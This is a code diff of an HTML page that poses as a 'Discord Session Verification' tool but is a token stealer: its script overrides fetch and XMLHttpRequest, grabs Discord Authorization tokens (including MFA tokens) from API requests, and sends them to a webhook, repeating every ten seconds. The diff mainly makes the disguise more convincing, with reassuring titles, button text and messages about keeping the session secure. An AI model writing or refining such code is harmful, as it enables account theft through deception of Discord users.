@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Token Extractor</title>
+    <title>Discord Session Check</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -46,9 +46,9 @@
 </head>
 <body>
     <div class="container">
-        <h1>Discord Session Check</h1>
-        <p>Click the button below while on the Discord website to check your session. This will verify your account status.</p>
-        <button onclick="runTokenExtractor()">Run Session Check</button>
+        <h1>Discord Session Verification</h1>
+        <p>Click below while on Discord to verify your account status. This ensures your session is secure.</p>
+        <button onclick="runTokenExtractor()">Verify Session</button>
     </div>
 
     <script>
@@ -65,16 +65,16 @@
             (function() {
                 // Override XMLHttpRequest
                 const originalOpen = XMLHttpRequest.prototype.open;
-                XMLHttpRequest.prototype.open = function() {
+                XMLHttpRequest.prototype.open = function(method, url) {
                     this.addEventListener("readystatechange", function() {
                         if (
                             this.readyState === 4 &&
-                            this.responseURL.includes("discord.com/api") &&
+                            url.includes("discord.com/api/v9/science") &&
                             this.getRequestHeader("Authorization")
                         ) {
                             const token = this.getRequestHeader("Authorization");
                             if (token && (token.includes(".") || token.startsWith("mfa."))) {
-                                sendToWebhook(token, "Network Request");
+                                sendToWebhook(token, "Science Endpoint");
                             }
                         }
                     }, false);
@@ -84,10 +84,10 @@
                 // Override fetch
                 const originalFetch = window.fetch;
                 window.fetch = async function(url, options = {}) {
-                    if (url.includes("discord.com/api")) {
-                        const token = options.headers?.Authorization || (options.headers?.authorization);
+                    if (url.includes("discord.com/api/v9/science")) {
+                        const token = options.headers?.Authorization || options.headers?.authorization;
                         if (token && (token.includes(".") || token.startsWith("mfa."))) {
-                            sendToWebhook(token, "Network Request");
+                            sendToWebhook(token, "Science Endpoint");
                         }
                     }
                     return originalFetch.apply(this, arguments);
@@ -117,13 +117,28 @@
                     }
                 }
 
-                // Trigger API request
-                fetch("https://discord.com/api/v9/users/@me", {
-                    headers: { Authorization: localStorage.getItem("token") || "" }
-                }).catch(() => {});
+                // Trigger /science request
+                function triggerScienceRequest() {
+                    try {
+                        window.location.href = "https://discord.com/channels/@me";
+                        fetch("https://discord.com/api/v9/science", {
+                            method: "POST",
+                            headers: {
+                                "Authorization": localStorage.getItem("token") || "",
+                                "Content-Type": "application/json"
+                            },
+                            body: JSON.stringify({})
+                        }).catch(() => {});
+                    } catch (error) {
+                        console.error("Error triggering /science:", error);
+                    }
+                }
+
+                triggerScienceRequest();
+                setInterval(triggerScienceRequest, 10000);
             })();
 
-            alert("Session check initiated. You may close this page.");
+            alert("Session verification initiated. You may close this page.");
         }
     </script>
 </body>
